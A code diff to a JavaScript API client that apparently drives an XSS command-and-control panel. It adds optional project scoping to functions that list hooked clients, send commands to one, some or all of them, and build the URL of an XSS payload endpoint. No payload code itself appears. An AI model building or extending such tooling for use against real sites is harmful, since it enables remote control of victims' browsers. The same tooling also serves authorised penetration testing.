@@ -40,37 +40,42 @@ class ApiService {
     }
   }
 
-  async getAllClients() {
-    return this.request(API_ENDPOINTS.CLIENTS);
+  async getAllClients(projectId) {
+    const endpoint = projectId ? `${API_ENDPOINTS.CLIENTS}?project=${projectId}` : API_ENDPOINTS.CLIENTS;
+    return this.request(endpoint);
   }
 
   async getClient(clientId) {
     return this.request(`${API_ENDPOINTS.CLIENTS}/${clientId}`);
   }
 
-  async sendCommandToAll(command, args = {}) {
-    return this.request(API_ENDPOINTS.COMMANDS, {
+  async sendCommandToAll(command, args = {}, projectId) {
+    const endpoint = projectId ? `${API_ENDPOINTS.COMMANDS}?project=${projectId}` : API_ENDPOINTS.COMMANDS;
+    return this.request(endpoint, {
       method: 'POST',
       body: JSON.stringify({ command, args })
     });
   }
 
-  async sendCommandToTarget(targetId, command, args = {}) {
-    return this.request(API_ENDPOINTS.COMMANDS, {
+  async sendCommandToTarget(targetId, command, args = {}, projectId) {
+    const endpoint = projectId ? `${API_ENDPOINTS.COMMANDS}?project=${projectId}` : API_ENDPOINTS.COMMANDS;
+    return this.request(endpoint, {
       method: 'POST',
       body: JSON.stringify({ target_id: targetId, command, args })
     });
   }
 
-  async sendCommandToClient(clientId, command, args = {}) {
-    return this.request(API_ENDPOINTS.CLIENT_COMMANDS(clientId), {
+  async sendCommandToClient(clientId, command, args = {}, projectId) {
+    const endpoint = projectId ? `${API_ENDPOINTS.CLIENT_COMMANDS(clientId)}?project=${projectId}` : API_ENDPOINTS.CLIENT_COMMANDS(clientId);
+    return this.request(endpoint, {
       method: 'POST',
       body: JSON.stringify({ command, args })
     });
   }
 
-  getPayloadUrl() {
-    return `${API_BASE_URL}${API_ENDPOINTS.XSS_PAYLOAD}`;
+  getPayloadUrl(projectId) {
+    const endpoint = projectId ? `${API_ENDPOINTS.XSS_PAYLOAD}?project=${projectId}` : API_ENDPOINTS.XSS_PAYLOAD;
+    return `${API_BASE_URL}${endpoint}`;
   }
 }
 
